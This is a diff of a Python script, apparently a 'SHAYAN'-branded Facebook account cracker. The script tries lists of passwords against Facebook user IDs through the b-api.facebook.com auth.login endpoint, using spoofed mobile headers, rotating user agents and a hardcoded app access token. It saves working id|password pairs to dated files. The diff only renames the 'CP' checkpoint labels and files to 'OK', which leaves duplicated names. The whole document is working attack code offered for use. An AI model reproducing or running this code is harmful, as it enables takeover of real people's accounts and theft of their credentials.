@@ -24,7 +24,7 @@ except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) O
 try:ugen2 = open('user2.txt','r').read().splitlines()
 except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
 
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+id,id2,loop,ok,OK,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
 x = '\033[93m'
 k = '\033[93m'
@@ -67,7 +67,7 @@ tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+OKc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
 my_id = '100007061760822'
 
@@ -197,26 +197,26 @@ def passwrd():
 		exit()
 
 def crack2(idf,pwv):
-	global loop,ok,cp
+	global loop,ok,OK
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s [SHAYAN] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s [SHAYAN] %s/%s  OK*%s | OK*%s => %s%s%s'%(bi,loop,len(id2),ok,OK,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
+			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&OKl=true", headers=head)
 			if "www.facebook.com" in resp.json()["error_msg"]:
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					print('\r%s [SHAYAN-CP] %s|%s        '%(b,idf,pw))
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					print('\r%s [SHAYAN-OK] %s|%s        '%(b,idf,pw))
+					open('OK/'+OKc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
-					cp+=1
+					OK+=1
 				break
 			elif "session_key" in resp.text and "EAAB" in resp.text:
 				print('\r%s [ok] %s|%s        '%(h,idf,pw))
@@ -243,7 +243,7 @@ def mlaku(z):
 
 if __name__=='__main__':
 	os.system('git pull')
-	try:os.mkdir('CP')
+	try:os.mkdir('OK')
 	except:pass
 	try:os.mkdir('OK')
 	except:pass
